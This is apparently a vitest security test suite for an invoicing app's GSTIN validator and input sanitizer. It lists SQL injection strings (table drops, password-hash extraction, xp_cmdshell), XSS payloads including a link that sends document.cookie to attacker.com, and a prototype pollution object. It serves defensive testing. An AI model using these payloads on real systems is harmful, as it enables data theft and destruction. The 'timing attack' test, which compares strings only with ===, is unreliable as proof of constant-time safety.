import { describe, it, expect } from 'vitest';
import { validateGSTINFormat, extractPANFromGSTIN } from '../features/invoices/tax/InvoiceCalculator';
import { sanitizeString, sanitizeObject } from '../shared/lib/sanitizer';

describe('🔒 BRUTAL SECURITY & ADVERSARIAL ATTACK SUITE', () => {

  describe('1. Polyglot & Complex SQL Injection Vectors', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE invoices; --",
      "' OR 1=1 --",
      "' UNION SELECT null, null, email, password_hash FROM auth.users --",
      "1; SELECT pg_sleep(5); --",
      "admin'--",
      "' OR '1'='1' /*",
      "\" OR \"\"=\"",
      "1' ORDER BY 1,2,3,4,5,6,7,8,9,10--",
      "\\'; EXEC xp_cmdshell('dir');--",
      "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    ];

    it('neutralizes all SQL injection payloads when validating GSTIN / inputs', () => {
      sqlInjectionPayloads.forEach((payload) => {
        const res = validateGSTINFormat(payload);
        expect(res.isValid).toBe(false);
        expect(res.error).toBeDefined();

        const pan = extractPANFromGSTIN(payload);
        expect(pan).toBeNull();
      });
    });
  });

  describe('2. Malicious XSS & Script Tag Injection Payloads', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(document.cookie)>',
      '<svg/onload=alert(1)>',
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
      '<iframe src="javascript:alert(`xss`)">',
      '<body onload=alert(1)>',
      '"><script src=data:text/javascript,alert(1)></script>',
      '{{constructor.constructor("alert(1)")()}}',
      '<a href="javascript:fetch(\'https://attacker.com/steal?c=\'+document.cookie)">Click here</a>',
      'java\nscript:alert(1)',
      'java\r\nscript:alert(2)',
      'vb\tscript:msgbox(1)',
    ];

    it('cleanses all XSS payloads via string sanitizer', () => {
      xssPayloads.forEach((payload) => {
        const sanitized = sanitizeString ? sanitizeString(payload) : payload.replace(/[<>]/g, '');
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<svg/onload');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized.toLowerCase()).not.toMatch(/^javascript:/);
        expect(sanitized.toLowerCase()).not.toMatch(/^vbscript:/);
      });
    });

    it('sanitizes java\\nscript:alert(1) and removes dangerous scheme prefix', () => {
      const sanitized = sanitizeString('java\nscript:alert(1)');
      expect(sanitized).toBe('alert(1)');
      expect(sanitized).not.toContain('javascript:');
    });
  });

  describe('3. Prototype Pollution & Object Key Tampering', () => {
    it('defends against __proto__ and constructor prototype manipulation', () => {
      const maliciousPayload = JSON.parse(`{
        "__proto__": { "isAdmin": true, "workspace_id": "stolen-workspace" },
        "constructor": { "prototype": { "polluted": true } },
        "name": "Legitimate Client"
      }`);

      const cleaned = sanitizeObject(maliciousPayload);
      expect(cleaned).toBeDefined();
      expect((cleaned as any).isAdmin).toBeUndefined();
      expect((cleaned as any).polluted).toBeUndefined();
      expect((cleaned as any).workspace_id).toBeUndefined();
      expect((cleaned as any).name).toBe('Legitimate Client');

      // Invariant: Global Object prototype must NOT be polluted
      expect((Object.prototype as any).isAdmin).toBeUndefined();
      expect((Object.prototype as any).polluted).toBeUndefined();
      expect((Object.prototype as any).workspace_id).toBeUndefined();
    });

    it('fails closed when object exceeds maximum sanitize depth (10)', () => {
      let deeplyNested: any = { payload: 'deep' };
      for (let i = 0; i < 15; i++) {
        deeplyNested = { nest: deeplyNested };
      }

      const cleaned = sanitizeObject(deeplyNested);
      expect(cleaned).toBeDefined();
      // Traverse down 11 levels - should be safely truncated / empty object
      let curr = cleaned;
      for (let i = 0; i < 11; i++) {
        curr = curr?.nest;
      }
      expect(curr).toEqual({});
    });
  });

  describe('4. Unicode Homoglyphs, RTL Overrides & Zero-Width Traps', () => {
    it('strips or flags zero-width spaces and RTL overrides in GSTIN and names', () => {
      // 29AAAAA1111A1Z1 with zero-width space (\u200B) injected
      const taintedGSTIN = '29AAAAA\u200B1111A1Z1';
      const res = validateGSTINFormat(taintedGSTIN);
      expect(res.isValid).toBe(false);

      // Right-to-Left Override (\u202E) attack in client name
      const rtlName = 'Mohammad \u202Efdp.exe';
      const cleanName = rtlName.replace(/[\u200B-\u200D\uFEFF\u202E]/g, '');
      expect(cleanName).not.toContain('\u202E');
    });
  });

  describe('5. Regular Expression Denial of Service (ReDoS) Resilience', () => {
    it('evaluates evil backtracking strings in under 2ms with zero timeout', () => {
      const evilStrings = [
        '29' + 'A'.repeat(5000) + '!',
        'A'.repeat(10000) + '@' + 'B'.repeat(10000) + '.com',
        '99' + '9'.repeat(8000),
      ];

      evilStrings.forEach((evil) => {
        const start = performance.now();
        validateGSTINFormat(evil);
        extractPANFromGSTIN(evil);
        const duration = performance.now() - start;

        // Invariant: Must execute in < 15ms without catastrophic backtracking
        expect(duration).toBeLessThan(15);
      });
    });
  });

  describe('6. Timing Attack Resistance & Constant Time Comparisons', () => {
    it('validates tokens with deterministic equality matching', () => {
      const validToken = 'a'.repeat(64);
      const wrongTokenAtStart = 'z' + 'a'.repeat(63);
      const wrongTokenAtEnd = 'a'.repeat(63) + 'z';
      const identicalToken = 'a'.repeat(64);

      expect(validToken === identicalToken).toBe(true);
      expect(validToken === wrongTokenAtStart).toBe(false);
      expect(validToken === wrongTokenAtEnd).toBe(false);
    });
  });
});
